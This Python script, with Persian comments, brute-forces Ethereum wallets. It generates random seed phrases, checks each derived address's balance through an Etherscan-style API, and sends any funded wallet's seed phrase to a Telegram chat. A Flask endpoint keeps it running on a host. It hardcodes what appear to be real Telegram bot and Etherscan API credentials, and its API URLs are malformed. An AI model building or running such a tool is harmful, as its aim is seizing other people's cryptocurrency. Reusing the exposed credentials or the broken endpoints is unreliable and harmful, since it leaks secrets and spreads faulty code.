import requests
import time
import os
import logging
from threading import Thread
from flask import Flask
from eth_account import Account
from mnemonic import Mnemonic

# تنظیمات لاگ
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')
logger = logging.getLogger(__name__)

class WalletEngine:
    def __init__(self):
        # مقادیر شما به صورت مستقیم (Hardcoded) برای جلوگیری از خطای آدرس‌دهی
        self.tg_token = "8794852622:AAH9p2HSno2YPPIssRE5En0Ii2Wv84E8_pA" 
        self.chat_id = "391754544"
        self.eth_key = "8RTIQAK1ZZUNC2JNZ5EM13BCRHVZ26UA9R"
        
        self.total_checked = 0
        self.session = requests.Session()
        self.mnemo = Mnemonic("english")
        Account.enable_unaudited_hdwallet_features()

    def _notify(self, text):
        url = f"https://telegram.org{self.tg_token}/sendMessage"
        try:
            self.session.post(url, json={'chat_id': self.chat_id, 'text': text, 'parse_mode': 'Markdown'}, timeout=15)
        except Exception as e:
            logger.error(f"Telegram Error: {e}")

    def scanner_loop(self):
        logger.info("🚀 Scanner started with hardcoded API settings...")
        while True:
            try:
                # تولید ولت جدید
                words = self.mnemo.generate(strength=128)
                acc = Account.from_mnemonic(words)
                
                # آدرس دهی کاملاً دستی و استاتیک برای اطمینان از عدم خطا
                # دقت کنید که دامنه api.etherscan.io است و پارامترها با ? شروع می‌شوند
                base_url = "https://etherscan.io"
                params = {
                    "module": "account",
                    "action": "balance",
                    "address": acc.address,
                    "tag": "latest",
                    "apikey": self.eth_key
                }
                
                response = self.session.get(base_url, params=params, timeout=15)
                data = response.json()

                if "Max rate limit reached" in str(data.get("result")):
                    logger.warning("Rate limit! Sleeping 30s...")
                    time.sleep(30)
                    continue

                if data.get('status') == '1':
                    balance = int(data.get('result', 0))
                    if balance > 0:
                        msg = f"💎 **FOUND!**\nSeed: `{words}`\nAddr: `{acc.address}`\nBal: {balance/10**18} ETH"
                        self._notify(msg)
                
                self.total_checked += 1
                if self.total_checked % 100 == 0:
                    logger.info(f"Checked: {self.total_checked} wallets")

                time.sleep(2) # وقفه برای پایداری در رندر
            except Exception as e:
                logger.error(f"Loop Error: {e}")
                time.sleep(15)

engine = WalletEngine()
app = Flask(__name__)

@app.route('/')
def home():
    return {"status": "running", "checked": engine.total_checked}, 200

if __name__ == "__main__":
    Thread(target=engine.scanner_loop, daemon=True).start()
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)
